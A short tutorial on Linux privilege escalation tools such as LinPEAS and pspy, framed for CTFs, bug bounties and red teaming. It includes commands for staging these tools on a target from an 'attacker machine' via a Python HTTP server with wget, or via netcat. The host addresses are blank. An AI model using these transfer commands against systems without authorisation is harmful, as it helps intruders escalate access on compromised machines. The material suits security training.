Linux Privilege Escalation Tools

While manual techniques are crucial for learning, tools make it easier to identify vulnerabilities quickly. Below are some popular and effective tools used in real-world Linux privilege escalation scenarios.

Top Tools You Should Know

  • LinPEAS
  • Linux Exploit Suggester 2
  • pspy
  • LES (Linux Exploit Suggester)
  • LinEnum

What If the Target Machine Has No Internet?

Internet connection not available? No worries — you can transfer tools manually from your machine to the target. Here are a few ways:

Option 1: Use Python HTTP Server (from attacker machine)
# On your machine (in tool directory)
python3 -m http.server 8000
# On target machine
wget http://:8000/linpeas.sh
Option 2: Use Netcat
# On your machine
nc -lvp 9001 < linpeas.sh
# On target
nc  9001 > linpeas.sh
Option 3: USB (in physical access scenarios)

Mount USB, copy tool, and transfer it via cp.

Run scripts in /tmp or other writable directories on the target.

These tools are especially useful in CTFs, bug bounty, and red teaming scenarios. But make sure you also understand what each finding means — tools give results, but you need to turn those into action.
